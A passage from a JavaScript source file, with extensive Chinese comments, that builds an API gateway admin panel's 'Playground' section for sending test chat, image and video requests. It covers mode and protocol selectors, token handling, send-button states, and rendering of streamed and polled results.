但仍是一处会漂的耦合：真源改了形态名而这里没改，那一档会**变成一个永远没有可用端点\n * 的空档位**。\n * 由 `tests/ui/dom/playground-section.test.ts` 的\n * 「三个模式档都能选中，图片与视频各自真的挑到了自己那条端点 —— 形态名一漂就是一个永远空的档位」钉着。\n *\n * ⚠️ **漂了之后屏幕上到底是什么样，逐条数清楚**（上一版这里写的是「只显示一句\n * 『这个形态没有可用的端点』」，实测**没有这样一句话**，是一句假的描述）。\n * 下面三条是**把目录里两个 `modality` 全改名之后在 DOM 夹具里量出来的**，不是读代码推的：\n * · `buildMediaNote()` 的 `buildRequest(null, …)` 交出 `null` ⇒ 端点那一行**只剩标签，\n *   后面什么都没有**；\n * · `modelIdsForModality()` 交出空数组 ⇒ 模型下拉 0 个选项，下面多出一句\n *   `pg.model.noneMedia`「这个形态下没有可用的模型。」；\n * · `sendBlockedKey()` 走到 `pg.send.blockedNoEndpoint` ⇒ 发送按钮**变灰**，\n *   它的 tooltip 才是「协议目录里没有这个形态的端点，这一档发不出请求。」。\n * ⇒ **`pg.model.noneMedia` 与 `pg.send.blockedNoEndpoint` 这两个 key 不是死代码**：\n * 在**形态名不漂**的前提下它们确实取不到（`MODEL_CATALOG` 钉着 2 个 image + 1 个 video 模型、\n * `MEDIA_ENDPOINTS` 两档各有一条 `op === \"generate\"`，两者恒非空），\n * 但那个前提**正是这一段登记着会漂的东西** —— 它们是形态名漂移那一档的兜底文案，\n * 别把「结构性不可达」写成无条件的。\n */\nconst MODES = [\n  { mode: \"chat\", key: \"pg.mode.chat\" },\n  { mode: \"image\", key: \"pg.mode.image\" },\n  { mode: \"video\", key: \"pg.mode.video\" },\n];\n\nlet nodes = null;\n/**\n * 窄化之后的目录。`null` = **还没读到 / 读不出来**，两者在渲染上是同一档\n * （都还不知道这个网关认得哪些协议），区别只在「有没有人已经发过那次请求」。\n */\nlet catalog = null;\n/** 设置页那把网关口令的末几位。`null` = 读不到，比不了（**不等于「对不上」**）。 */\nlet hint = null;\n/** 已经问过一次 `GET /admin/api/config` 了吗。读不到 hint 不是错误，但也别每次切回来重问。 */\nlet hintAsked = false;\n/** 当前选中的协议 id 与模型 id。**取值来自响应，不是本地枚举。** */\nlet protoId = \"\";\nlet modelId = \"\";\n/** 输入框里的两样东西。**re-render 之后从这里回填**，所以整块重建不会丢用户输入。 */\nlet promptText = \"\";\nlet token = \"\";\n/** 流式开关的当前档位（P3d Task 11）。**同样要在 re-render 之后回填。** */\nlet streamOn = false;\n/**\n * 右栏那几轮对话。**只进不出**，切走板块也留着（同一次会话里回头对比很常见）。\n *\n * ⚠️ **没有上限，如实登记**（评审 L5）：每一轮存着一份响应体，一个开一整天、\n * 反复发几百次的标签页会把它们全留在内存里。**今天不加上限**——它要么是一个\n * 需要新 UI 状态的「清空」按钮、要么是一条静默丢弃用户看得见的内容的规则，\n * 两条都比这个问题本身大；而每一轮都是运维自己按出来的，量级与他的手速同阶。\n * **登记 P3e**：真要加，做成显式的「清空对话」而不是静默截断。\n *\n * ⚠️⚠️ **上面那句「量级与他的手速同阶」在 Task 12 落地后一度不成立，本轮才改回来**\n *（P3d 全分支评审 F-2）：Task 12 同时做了两件事——让 `turn.body` 可能是一张 MB 级的\n * base64 图，以及给视频档加了一个**每拍都整版 `render()`** 的 60 拍循环。\n * 两件相乘之后，一次视频任务的重建量变成 `60 × 全部轮次 × 每轮 body`\n *（实测 `turns=10` ⇒ ≈ 1.8 GB 临时字符串），**与手速已经不同阶了**。\n * 本轮的处置是把那个 60 倍的乘数拿掉（`pollOnce()` 里那段 ⚠️⚠️；**就地改的那两处\n * 与整版重建输出逐字相同**，由那段末尾点名的第 ③ 格钉着——上一版这里写的是一句\n * 没有机器守的「输出逐字不变」，而它当时**是假的**，复评 M-4 实测证伪），\n * ⇒ 重建量回到 `每次运维自己按一下 × 全部轮次`，与这段话原本描述的那一档重新对齐。\n * **仍然没有上限这件事没有变**，只是它不再被一个自动循环放大。\n */\nlet turns = [];\n/** 这一刻有没有一次对外请求在飞。它就是那道「在飞去重」。 */\nlet inFlight = false;\n/**\n * 在飞那一轮的**流式** turn（非流式恒为 `null`）。\n * 存在的唯一理由是 `cancelInFlight()` 要够得着它把 `pending` 收干净 —— 理由全文在那里。\n */\nlet streamingTurn = null;\n/**\n * 在飞那一次的取消器，**同时是「这一次还是不是当前那一次」的判据**。\n * 见文件头那段 ⚠️⚠️：abort 本身在测试里不可观测，被钉住的是这个身份比较。\n */\nlet current = null;\n/**\n * 目录那条读的在飞标记、世代号与**取消器**（与 `js/sec-models.js` 同一套，理由见那里）。\n *\n * ⚠️⚠️ **`loadAbort` 是 P3d 全分支评审 F-4 补的，补之前这里是全面板唯一一个读不可中止的板块。**\n * 另外六个板块级读（keys / events / overview / models / registrar / usage）**全部**带\n * `AbortController` + `{ signal }`，而 `api.js` 的 `raw()` 本来就把 `init.signal` 透给 `fetch`\n * ⇒ **不是能力缺失，是这一处少写了一半**。同一个文件里 `sendOnce()` 用的就是这套写法。\n * ⚠️ **这一族天然不可测**：`tests/ui/dom/harness.ts` 的 fetch 替身**不看 `signal`**\n *（账本已登记），⇒ 「六个板块 abort 了」与「Playground 没 abort」在机器上长得一模一样。\n * 所以这一处的判据只能是**与另外六处写法一致**，不是某一格用例。\n */\nlet loadInFlight = false;\nlet loadSeq = 0;\nlet loadAbort = null;\n/** 面板自己所在的那个源。`init()` 时读一次——**判定在纯函数里，那里拿不到浏览器全局**。 */\nlet origin = \"\";\n/** 当前模式档位（`chat` / `image` / `video`）。**换档要重挑模型**，与换协议同一条理由。 */\nlet mode = \"chat\";\n/**\n * 正在轮询的那一轮视频（`null` = 没有在轮）。\n *\n * ⚠️ **它与 `current` 是两件事，缺一不可**：`current` 回答「这一次还是不是当前那一次」\n * （身份比较，与非流式 / 流式共用同一条判据），这一格回答「该往哪一轮里写轮询结果」。\n * 合成一个的话，取消之后要么够不着那一轮把 `pending` 收干净（流式那一档栽过一次，\n * 见 `cancelInFlight()` 里那段 ⚠️⚠️），要么身份判据被一个可空的业务对象顶替。\n */\nlet pollTurn = null;\n/** 轮询那一轮的取消令牌。**与 `current` 是同一个对象**，留一份只为在回调里做身份比较。 */\nlet pollCtl = null;\n/** 定时器句柄与这一轮开始的时刻（时长上限那一条按它算）。 */\nlet pollTimer = null;\nlet pollStartedAt = 0;\n\n/** 一个内容块：标题 + 空的 body 容器。 */\nfunction block(titleKey) {\n  const wrap = el(\"div\", { class: \"card block\" });\n  wrap.appendChild(elI18n(\"h3\", titleKey));\n  const body = el(\"div\");\n  wrap.appendChild(body);\n  return { wrap, body };\n}\n\n/** 一行「标签 + 控件」。 */\nfunction field(labelKey, control) {\n  const wrap = el(\"div\", { class: \"pg-field\" });\n  wrap.appendChild(elI18n(\"span\", labelKey, { class: \"muted\" }));\n  wrap.appendChild(control);\n  return wrap;\n}\n\n/**\n * 模式分段：对话 / 图片 / 视频。**三档都接上了**（P3d Task 12）。\n * ⚠️ 三个 key 写成三个字面量（`MODES` 那张表里），**不许把档位名拼进 key**（全局约束 12）。\n */\nfunction buildModeBar() {\n  const bar = el(\"div\", { class: \"btn-group\" });\n  bar.appendChild(elI18n(\"span\", \"pg.mode.label\", { class: \"muted\" }));\n  for (const m of MODES) {\n    const btn = elI18n(\"button\", m.key, {\n      type: \"button\", class: \"btn-toggle\", \"data-mode\": m.mode,\n      \"aria-pressed\": m.mode === mode ? \"true\" : \"false\",\n    });\n    btn.classList.toggle(\"active\", m.mode === mode);\n    btn.addEventListener(\"click\", () => {\n      if (mode === m.mode) return;\n      mode = m.mode;\n      // 换档要重挑模型：对话模型与媒体模型是两批完全不相交的 id\n      //（媒体模型的 `protocols` 在真源里是空数组）。\n      modelId = \"\";\n      render();\n    });\n    bar.appendChild(btn);\n  }\n  return bar;\n}\n\n/**\n * 协议分段。**档位由响应里的 `protocols[]` 生成，本文件不认识任何一个协议 id。**\n * 展示名走响应里的 `label`（协议的专名，**刻意不进 i18n**，理由见\n * `src/core/admin/protocol-catalog.ts` 里 label 字段上方那一行）。\n */\nfunction buildProtoBar() {\n  const bar = el(\"div\", { class: \"btn-group\" });\n  bar.appendChild(elI18n(\"span\", \"pg.proto.label\", { class: \"muted\" }));\n  for (const p of catalog.protocols) {\n    const btn = el(\"button\", {\n      type: \"button\", class: \"btn-toggle\", \"data-protocol\": p.id,\n      \"aria-pressed\": p.id === protoId ? \"true\" : \"false\",\n    }, p.label);\n    btn.classList.toggle(\"active\", p.id === protoId);\n    btn.addEventListener(\"click\", () => {\n      if (protoId === p.id) return;\n      protoId = p.id;\n      // 换协议要重挑模型：上一条协议上可用的模型未必在这一条上也可用。\n      modelId = \"\";\n      render();\n    });\n    bar.appendChild(btn);\n  }\n  return bar;\n}\n\n/**\n * 媒体档里替掉协议分段的那一行：**这一档按一下会打哪条端点**。\n *\n * ⚠️ **地址是 `buildRequest()` 现拼出来的那一条，不是这里另拼一份**（全局约束 15）：\n * 另拼一份的话，屏幕上写着的那条与真发出去的那条可以不一样，而那正是本期核心设计\n * 决定要防的形态。构造不出来（目录与面板对不上）时这一行整个不画——画一条空地址\n * 比不画更糟。\n */\nfunction buildMediaNote() {\n  const wrap = el(\"div\", { class: \"pg-field pg-media-note\" });\n  wrap.appendChild(elI18n(\"span\", \"pg.media.endpoint\", { class: \"muted\" }));\n  const req = buildRequest(currentMediaEndpoint(), {\n    model: modelId, prompt: promptText, stream: false, origin,\n  });\n  if (req !== null) {\n    wrap.appendChild(el(\"span\", { class: \"mono pg-media-endpoint\" }, `${req.method} ${req.url}`));\n  }\n  return wrap;\n}\n\n/** 当前选中的那条协议，没有就是 `null`。**只在对话档有意义。** */\nfunction currentProto() {\n  if (catalog === null) return null;\n  for (const p of catalog.protocols) if (p.id === protoId) return p;\n  return null;\n}\n\n/** 当前媒体档要打的那条**生成**端点，没有就是 `null`。 */\nfunction currentMediaEndpoint() {\n  if (catalog === null) return null;\n  for (const m of catalog.media) if (m.modality === mode && m.op === \"generate\") return m;\n  return null;\n}\n\n/** 视频那条**轮询**端点，没有就是 `null`。 */\nfunction pollEndpoint() {\n  if (catalog === null) return null;\n  for (const m of catalog.media) if (m.modality === \"video\" && m.op === \"poll\") return m;\n  return null;\n}\n\n/**\n * 这一档要打的那条端点（对话 = 选中的协议；媒体 = 那条生成端点）。\n * **`buildRequest()` 对两者一视同仁**——它只看 `pathTemplate` / `method` / `authHeader` /\n * `sampleBody` / `samplePrompt` 这几格，而媒体端点在真源里就是照着同一组字段填的。\n * ⇒ **本板块因此没有第二条请求构造路径**（全局约束 15 的同一条理由）。\n */\nfunction currentTarget() {\n  return mode === \"chat\" ? currentProto() : currentMediaEndpoint();\n}\n\n/** 这一档下可用的模型 id。**两根轴，两个纯函数**，理由见 `modelIdsForModality()` 上方。 */\nfunction currentModelIds() {\n  if (catalog === null) return [];\n  return mode === \"chat\"\n    ? modelIdsForProtocol(currentProto(), catalog.models)\n    : modelIdsForModality(mode, catalog.models);\n}\n\n/**\n * 模型下拉。**只列这一档上真的可用的模型**（判定在 `js/pure/playground.mjs`）。\n * 一个都没有时下拉是空的，而下面那句提示会说清是哪一档。\n */\nfunction buildModelSelect(ids) {\n  const sel = el(\"select\", { class: \"pg-model\" });\n  for (const id of ids) {\n    const opt = el(\"option\", { value: id }, id);\n    sel.appendChild(opt);\n  }\n  // **显式回写 `.value`**：整块每次重建，不写的话选中项会掉回第一项。\n  sel.value = modelId;\n  sel.disabled = ids.length === 0;\n  sel.addEventListener(\"change\", () => { modelId = sel.value; });\n  return sel;\n}\n\n/**\n * 流式开关（P3d Task 11 接上）。\n *\n * ⚠️ **`.checked` 每次重建都要显式回写**：整块 re-render 之后不写的话，运维打开的\n * 那一档会静默地掉回关闭，而**下一次发送就是一次非流式请求**——请求照样 200、\n * 内容照样对，只是一次性全回来，面板上没有任何东西会提到这件事\n * （与 `buildModelSelect()` 里那句 `sel.value = modelId` 同一条理由）。\n */\nfunction buildStreamToggle() {\n  const box = el(\"input\", { type: \"checkbox\", class: \"pg-stream\" });\n  box.setAttribute(\"title\", t(\"pg.stream.tip\"));\n  box.checked = streamOn;\n  box.addEventListener(\"change\", () => { streamOn = box.checked === true; });\n  return box;\n}\n\n/** 口令与 hint 对不对得上那一句。**只画档位名，不含口令的任何一个字节。** */\nfunction hintNoteKey() {\n  const state = tokenHintState(token, hint);\n  if (state === \"empty\") return \"pg.token.stateEmpty\";\n  if (state === \"unknown\") return \"pg.token.stateUnknown\";\n  if (state === \"match\") return \"pg.token.stateMatch\";\n  return \"pg.token.stateMismatch\";\n}\n\n/** 那一句的样式档。三档颜色不同，**同时靠文字表达**（不只靠颜色）。 */\nfunction hintNoteClass() {\n  const state = tokenHintState(token, hint);\n  if (state === \"match\") return \"pg-hint pg-hint-ok\";\n  if (state === \"mismatch\") return \"pg-hint pg-hint-bad\";\n  return \"pg-hint muted\";\n}\n\n/** 把那一句就地刷一遍。**不整块重画**——重画会让口令输入框丢焦点。 */\nfunction syncHintNote() {\n  if (nodes === null || nodes.hintNote === null) return;\n  nodes.hintNote.textContent = t(hintNoteKey());\n  nodes.hintNote.setAttribute(\"class\", hintNoteClass());\n}\n\n/**\n * 网关口令输入框。\n *\n * ⚠️ **`type=\"password\"`**：这把口令是发给每一个下游用户的那把中转口令，\n * 让它明晃晃地留在一块可能被投屏 / 被同事看一眼的屏幕上没有任何好处。\n * ⚠️ **`autocomplete=\"off\"`**：别让浏览器把它和管理口令混进同一个密码条目。\n */\nfunction buildTokenInput() {\n  const input = el(\"input\", {\n    type: \"password\", class: \"pg-token\", autocomplete: \"off\",\n    \"data-i18n-ph\": \"pg.token.placeholder\",\n  });\n  input.setAttribute(\"placeholder\", t(\"pg.token.placeholder\"));\n  input.value = token;\n  input.addEventListener(\"input\", () => {\n    token = input.value;\n    // 存 localStorage（全局约束 11(b)：手动粘贴 + 本地保存，后端不回显）。\n    writeGatewayToken(token);\n    syncHintNote();\n    syncSendButton();\n  });\n  return input;\n}\n\n/** 提示词输入框。 */\nfunction buildPromptInput() {\n  const area = el(\"textarea\", { class: \"pg-prompt\", rows: \"4\", \"data-i18n-ph\": \"pg.prompt.placeholder\" });\n  area.setAttribute(\"placeholder\", t(\"pg.prompt.placeholder\"));\n  area.value = promptText;\n  area.addEventListener(\"input\", () => { promptText = area.value; syncSendButton(); });\n  return area;\n}\n\n/** 这一刻能不能按发送；不能的话是哪一档（`null` = 能按）。 */\nfunction sendBlockedKey() {\n  if (inFlight) return \"pg.send.blockedInFlight\";\n  // **两档说的不是同一句话**：对话档缺的是「还没选协议」（选得回来），\n  // 媒体档缺的是「目录里根本没有这个形态的端点」（选不回来，是版本对不上）。\n  // 折叠成一句会让运维在媒体档下去找一个屏幕上根本不存在的协议选择器。\n  if (mode === \"chat\") {\n    if (currentProto() === null) return \"pg.send.blockedNoProto\";\n  } else if (currentMediaEndpoint() === null) {\n    return \"pg.send.blockedNoEndpoint\";\n  }\n  if (modelId === \"\") return \"pg.send.blockedNoModel\";\n  if (token === \"\") return \"pg.send.blockedNoToken\";\n  if (promptText.trim() === \"\") return \"pg.send.blockedNoPrompt\";\n  return null;\n}\n\n/**\n * 发送按钮的可用性与 tooltip 就地刷一遍（同 `syncHintNote`，不整块重画）。\n *\n * ⚠️⚠️ **视频档的那句话不能与另两档共用，这是评审 M2 抓到的一句假话。**\n * `pg.send.ready` 五语言逐字都写着「按一下会真的向上游发**一次**请求」\n * （en `one request` / ja `1 回` / ko `한 번`）——**而视频档一次点击是\n * 1 次建任务 + 最多 `VIDEO_POLL_MAX_ATTEMPTS` 次轮询。**\n * 这是全局约束 14「按钮与护栏一起交付」的**披露那一半**：护栏（在飞去重、两条上限、\n * 藏起来暂停、切走即停）我都做了，**而运维在按下之前唯一看得到的那句话没跟着改**。\n * ⚠️ **次数从常量插值进去，不写死在字典里**：写死的话改常量就会让那句话变成假话，\n * 而字典没有任何机器在守（W4b）。\n * 由 `tests/ui/dom/playground-section.test.ts` 的\n * 「视频档按下之前那句话说的是 1 + 60 次，不是「一次」 —— 它是运维唯一看得到代价的地方（评审 M2）」钉着。\n */\nfunction syncSendButton() {\n  if (nodes === null || nodes.send === null) return;\n  const blocked = sendBlockedKey();\n  nodes.send.disabled = blocked !== null;\n  if (blocked !== null) {\n    nodes.send.setAttribute(\"title\", t(blocked));\n    return;\n  }\n  nodes.send.setAttribute(\"title\", mode === \"video\"\n    ? t(\"pg.send.readyVideo\", { count: String(VIDEO_POLL_MAX_ATTEMPTS) })\n    : t(\"pg.send.ready\"));\n}\n\n/**\n * 左栏。\n *\n * ⚠️ **协议用分段按钮而不是 `<input type=\"radio\">`**：其余三个板块的同类控件\n * （事件级别、用量口径、模型筛选）都是这一套 `.btn-group` / `.btn-toggle`，\n * 各写一套迟早长得不一样。另有一条实测理由：`tests/helpers/fake-dom.ts` 没有\n * 单选组语义（`.checked` 只是元素上的一个普通字段），用 radio 的话「四选一」这件事\n * 会变成**只有真实浏览器才验得到**的行为（第 9 种假阳性）。\n */\nfunction buildLeft() {\n  const { wrap, body } = block(\"pg.req.title\");\n  body.appendChild(buildModeBar());\n\n  // ⚠️ **默认模型必须在这里定下来，不能留在 `buildModelSelect()` 里**：媒体档那一行\n  //    「这一档打的端点」是 `buildRequest()` 现拼的，而 `buildRequest()` 在模型为空时\n  //    交出 `null` ⇒ 定得比它晚的话，那一行**永远不出现**，而屏幕上看起来只是\n  //    「这一档没有端点」——一个纯粹由渲染顺序造成的假象。\n  const ids = currentModelIds();\n  if (modelId === \"\" && ids.length > 0) modelId = ids[0];\n\n  // **协议分段只在对话档出现**：媒体那两条端点不属于任何一条对话协议\n  //（真源里它们的模型 `protocols` 是空数组），摆一排选不动的协议按钮只会让人以为\n  // 图片也能挑协议。媒体档换成一行「这一档打的是哪条端点」的说明。\n  if (mode === \"chat\") {\n    body.appendChild(buildProtoBar());\n  } else {\n    body.appendChild(buildMediaNote());\n  }\n\n  body.appendChild(field(\"pg.model.label\", buildModelSelect(ids)));\n  if (ids.length === 0) {\n    body.appendChild(elI18n(\"p\", mode === \"chat\" ? \"pg.model.none\" : \"pg.model.noneMedia\",\n      { class: \"muted note\" }));\n  }\n  // **流式开关只在对话档出现**：媒体那两条端点没有流式形态（真源里它们连\n  // `streamMode` 这一格都没有）。留一个按不动的开关会让人以为图片也能流式。\n  if (mode === \"chat\") body.appendChild(field(\"pg.stream.label\", buildStreamToggle()));\n\n  const tokenInput = buildTokenInput();\n  body.appendChild(field(\"pg.token.label\", tokenInput));\n  const note = el(\"span\", { class: hintNoteClass() }, t(hintNoteKey()));\n  nodes.hintNote = note;\n  body.appendChild(note);\n  body.appendChild(elI18n(\"p\", \"pg.token.note\", { class: \"muted note\" }));\n\n  body.appendChild(field(\"pg.prompt.label\", buildPromptInput()));\n\n  const bar = el(\"div\", { class: \"toolbar\" });\n  const send = elI18n(\"button\", \"pg.send\", { type: \"button\", class: \"pg-send\" });\n  send.addEventListener(\"click\", () => { sendOnce(); });\n  nodes.send = send;\n  bar.appendChild(send);\n  if (inFlight) {\n    const cancel = elI18n(\"button\", \"pg.cancel\", { type: \"button\", class: \"pg-cancel\" });\n    cancel.addEventListener(\"click\", () => { cancelInFlight(); render(); });\n    bar.appendChild(cancel);\n    bar.appendChild(elI18n(\"span\", \"pg.sending\", { class: \"muted pg-sending\" }));\n  }\n  body.appendChild(bar);\n  syncSendButton();\n  return wrap;\n}\n\n/**\n * 一条媒体结果地址那一行：**地址原文 + 复制按钮 +（可链接就）在新标签页打开**。\n *\n * ⚠️⚠️ **`rel=\"noopener noreferrer\"` 是显式写的，不是靠浏览器补**（评审 I9）：\n * `target=\"_blank\"` 的 a 元素现代浏览器确实会隐式补 `noopener`，但那是**浏览器的默认值、\n * 不是这段代码的性质**——一个 `rel=\"opener\"` 的改动、一台老浏览器、或者哪天有人把这里\n * 换成 `window.open()`（它从来不补），三条路径都会让被打开的那一页拿到\n * `opener` 引用，而**这一页的 origin 上存着 `ADMIN_TOKEN`**。\n * `noreferrer` 是另一件事：不把面板自己的地址（含路径）泄给上游给的那个主机。\n *\n * ⚠️ **只有 `mediaEmbeddable()` 为真的那一种才画 img**，判定在纯函数里、不在这里目测。\n * 远端地址一律不内嵌——CSP 的 img-src 里没有任何远端主机，画出来只会是一张永远\n * 加载失败的破图，而那比不画更让人以为「结果坏了」。\n */\nfunction buildMediaRow(url) {\n  const row = el(\"div\", { class: \"pg-media-row\" });\n  row.appendChild(el(\"span\", { class: \"mono pg-media-url\" }, url));\n  const btn = elI18n(\"button\", \"pg.media.copy\", { type: \"button\", class: \"pg-media-copy\" });\n  btn.addEventListener(\"click\", () => { copy(url); });\n  row.appendChild(btn);\n  if (mediaLinkable(url)) {\n    row.appendChild(elI18n(\"a\", \"pg.media.open\", {\n      class: \"pg-media-open\", href: url, target: \"_blank\", rel: \"noopener noreferrer\",\n    }));\n  }\n  if (mediaEmbeddable(url)) {\n    row.appendChild(el(\"img\", { class: \"pg-media-img\", src: url, alt: t(\"pg.media.alt\") }));\n  }\n  return row;\n}\n\n/**\n * 媒体那一轮的结果区。**四种出口，互斥且都说得出自己是哪一档**：\n * ① 有地址 ⇒ 逐条列出来（不替运维挑哪条是成片，理由见 `mediaResultUrls()`）；\n * ② 没地址、而且响应根本不是 JSON ⇒ **上游这次回的是字节流**，如实说它是什么类型；\n * ③ 没地址、响应是 JSON ⇒ 「这次的响应里没有出现任何一条地址」；\n * ④ 出错 ⇒ 错误档位名。\n *\n * ⚠️ **②与③必须分开**（全局约束 9 的同型）：`src/http/routes/media.ts` 的文件头写着\n * 「上游返回什么（地址或字节流）就原样转发」——**两种都可能，而且都不是异常**。\n * 折叠成一句「没有结果」的话，字节流那一档会被读成「这次生成失败了」，\n * 而它其实成功了、只是结果是一段字节而面板按 CSP 不内嵌它。\n *\n * ⚠️ **响应原文照旧摆出来**（与非流式对话档同一条）：它是这个调试工具最有用的东西，\n * 而且**它不会说假话**——上面那四档里任何一档判错了，原文都摆在下面可以自己看。\n */\nfunction buildMediaResult(turn) {\n  const box = el(\"div\", { class: \"pg-media\" });\n  // **正在轮的那一轮，把盒子本身记下来**：轮询的每一拍只重填**这一个盒子**，\n  // 不整版 `render()`。理由与实测数字在 `pollOnce()` 里那段 ⚠️⚠️。\n  if (turn === pollTurn) nodes.pollBox = box;\n  fillMediaResult(box, turn);\n  return box;\n}\n\n/**\n * 把媒体那一轮的内容填进 `box`。**`buildMediaResult()` 与轮询那一拍共用这一份**\n * ——两处各写一遍的话，轮询期间屏幕上那一格与重画之后那一格会是两套渲染判据，\n * 而它们之间的差别只在真机上看得见（本仓已登记过同型：两份实现分叉时绿的那份会赢）。\n */\nfunction fillMediaResult(box, turn) {\n  if (turn.errorKey !== null) {\n    box.appendChild(elI18n(\"p\", turn.errorKey, { class: \"danger-text pg-error\" }));\n  }\n  const urls = mediaResultUrls(turn.body);\n  for (const u of urls) box.appendChild(buildMediaRow(u));\n  if (urls.length === 0 && turn.errorKey === null) {\n    // **判据是响应头，不是猜**（`js/gw-api.js` 的 `sendToGateway()` 把它带回来了）。\n    if (turn.body === null && !/^application\\/json/i.test(turn.contentType)) {\n      box.appendChild(el(\"p\", { class: \"muted note pg-media-bytes\" },\n        t(\"pg.media.bytes\", { type: fmtDash(turn.contentType === \"\" ? null : turn.contentType) })));\n    } else if (turn.status !== null) {\n      box.appendChild(elI18n(\"p\", \"pg.media.none\", { class: \"muted note pg-media-none\" }));\n    }\n  }\n  // ── 视频两段式的进度 ────────────────────────────────────────────────────\n  if (turn.taskId !== null) {\n    const row = el(\"div\", { class: \"pg-media-row pg-task\" });\n    row.appendChild(elI18n(\"span\", \"pg.media.taskId\", { class: \"muted\" }));\n    row.appendChild(el(\"span\", { class: \"mono pg-task-id\" }, turn.taskId));\n    const btn = elI18n(\"button\", \"pg.media.copy\", { type: \"button\", class: \"pg-task-copy\" });\n    btn.addEventListener(\"click\", () => { copy(turn.taskId); });\n    row.appendChild(btn);\n    box.appendChild(row);\n  }\n  if (turn.pollState === \"polling\") {\n    box.appendChild(el(\"p\", { class: \"muted note pg-poll\" },\n      t(\"pg.media.polling\", { count: String(turn.pollAttempt) })));\n  }\n  if (turn.pollState === \"gaveUp\") {\n    // **到点了要说出来，并且把标识摆着**：静默停下留下的是一个永远「进行中」的框。\n    box.appendChild(elI18n(\"p\", \"pg.media.pollGaveUp\", { class: \"muted note pg-poll-gaveup\" }));\n  }\n  if (turn.pollState === \"noTaskId\") {\n    box.appendChild(elI18n(\"p\", \"pg.media.noTaskId\", { class: \"muted note pg-no-task\" }));\n  }\n  if (turn.cancelled === true) {\n    box.appendChild(elI18n(\"p\", \"pg.turn.cancelled\", { class: \"muted note pg-cancelled\" }));\n  }\n  const text = turn.body === null ? null : prettyJson(turn.body);\n  if (text !== null) box.appendChild(el(\"pre\", { class: \"mono pg-body\" }, text));\n}\n\n/**\n * 一轮对话。**上行只画运维自己输入的那句话与这次打的地址，绝不画请求头**\n * ——请求头里正是那把网关口令（全局约束 11(b)）。\n */\nfunction buildTurn(turn) {\n  const wrap = el(\"div\", { class: \"pg-turn\" });\n  const head = el(\"div\", { class: \"pg-turn-head\" });\n  head.appendChild(elI18n(\"span\", \"pg.turn.you\", { class: \"muted\" }));\n  // 地址那一格只在**这次真的构造出了一条请求**时才画：构造失败那一档 `url` 是空串，\n  // 画出来会是一条看着像地址的空壳，而那次请求根本没有地址可言。\n  if (turn.url !== \"\") {\n    head.appendChild(el(\"span\", { class: \"mono pg-endpoint\" }, `${turn.method} ${turn.url}`));\n  }\n  wrap.appendChild(head);\n  wrap.appendChild(el(\"p\", { class: \"pg-turn-prompt\" }, turn.promptText));\n\n  const foot = el(\"div\", { class: \"pg-turn-head\" });\n  foot.appendChild(elI18n(\"span\", \"pg.turn.gateway\", { class: \"muted\" }));\n  if (turn.status !== null) {\n    const status = el(\"span\", { class: \"mono pg-status\" }, String(turn.status));\n    // **正在轮的那一轮，把这一格也记下来**（与下面 `buildMediaResult()` 记盒子同一条理由）。\n    // ⚠️⚠️ **它画在这里，不在那个媒体盒子里**，而 `pollOnce()` 每一拍都改写 `turn.status`。\n    //    上一版只记了盒子 ⇒ 轮询回 500 时屏幕上这一格还停在上一拍那个 200，\n    //    旁边就贴着 `{\"error\":…}` 的响应原文——**两句话互相矛盾，而前一句是编的**\n    //    （复评 M-4 逐节点 diff 实测；同型纪律见下面流式那一档的 ⚠️）。\n    if (turn === pollTurn) nodes.pollStatus = status;\n    foot.appendChild(status);\n  }\n  wrap.appendChild(foot);\n\n  // ── 媒体那一轮：**只画地址，不内嵌远端任何东西**（全局约束 17）─────────────────\n  // 它比错误分支更早，因为媒体那一档**出错时也还有话要说**（任务标识、轮询进度），\n  // 而下面那条错误分支是 `return wrap` 的，走到它就什么都不剩了。\n  if (turn.mode !== \"chat\") {\n    wrap.appendChild(buildMediaResult(turn));\n    return wrap;\n  }\n\n  // ── 流式那一轮：画拼起来的正文，**不画响应原文**（它没有「原文」可画）──────────\n  // ⚠️ **顺序是刻意的**：正文在最上面。这一轮就算最后失败了，运维已经看到的那半句话\n  //    是真的发生过的，把它挪到错误提示下面（或者抹掉）都会让人以为它没到过。\n  if (turn.stream === true && turn.streamed === true) {\n    const body = el(\"pre\", { class: \"mono pg-body pg-stream-text\" }, turn.text);\n    // 这一轮还在收的话，把这个节点记下来：后续每一块**就地改 textContent**，\n    // 不整块重画（重画会让左栏的输入框丢焦点，而流式一秒能来几十块）。\n    if (turn.pending === true) nodes.streamText = body;\n    wrap.appendChild(body);\n    // **「这条流一个字都没有」是一句关于「它读完了」的话，四个前提缺一不可**（评审 F1/F3）：\n    // · `pending` 期间不许说 —— 那时候它只是**还没到**（说话的是 pg.sending）；\n    // · 出错那一档不许说 —— 那条流**根本没开起来 / 没读完**，说「读完了」是假话。\n    //   ⚠️ 这一条是评审实测抓到的：漏掉它，断网那一轮会**同时**画出\n    //   「这条流读完了，但里面一个字的正文都没有」与「这次请求没有拿到任何响应」，\n    //   **两句话互相矛盾，而前一句是编的**；\n    // · 取消那一档不许说 —— 同上，是运维自己把它掐了，不是它读完了。\n    if (turn.text === \"\" && turn.pending !== true && turn.errorKey === null && turn.cancelled !== true) {\n      wrap.appendChild(elI18n(\"p\", \"pg.turn.streamEmpty\", { class: \"muted note pg-stream-empty\" }));\n    }\n    if (turn.cancelled === true) {\n      // **取消要说出来**：一个空白框 + 一句「流式不统计 token」什么都没解释。\n      wrap.appendChild(elI18n(\"p\", \"pg.turn.cancelled\", { class: \"muted note pg-cancelled\" }));\n    }\n    if (turn.malformed > 0) {\n      // **静默丢弃就是撒谎**（与事件板块的 malformed 同一条理由）：读不出来的块数\n      // 必须说出来，不然面板会把一段缺字的回答当成完整的回答画出去。\n      const note = el(\"p\", { class: \"muted note pg-malformed\" },\n        t(\"pg.turn.malformed\", { count: String(turn.malformed) }));\n      // **还在收的那一轮，把这一格也记下来**（与上面 `nodes.streamText` 同一条理由，\n      // 也与轮询那一档的 `nodes.pollStatus` 同一套写法与生命周期）。\n      // ⚠️⚠️ **它画在那个 `<pre>` 外面**，而 `onPayload` 每来一块读不出来的数据都改\n      //    `turn.malformed` ⇒ 只就地改 `<pre>` 的 `textContent` **够不着这一格**。\n      //    上一版正是如此：流式在途期间屏幕上一个字都不提「掉了几块」，\n      //    **把一段缺字的回答当成完整的回答画着**，直到流结束那一次整版 `render()` 才补上\n      //    （复评 G2 实测：在途 `.pg-malformed` 0 / 强制重建 1）——\n      //    而上面那句「静默丢弃就是撒谎」正是本文件自己写的。\n      //    机理与 `.pg-status` 那一次逐字同型：**就地更新的那个节点之外，\n      //    还有一份会变的状态被渲染在别处。**\n      if (turn.pending === true) 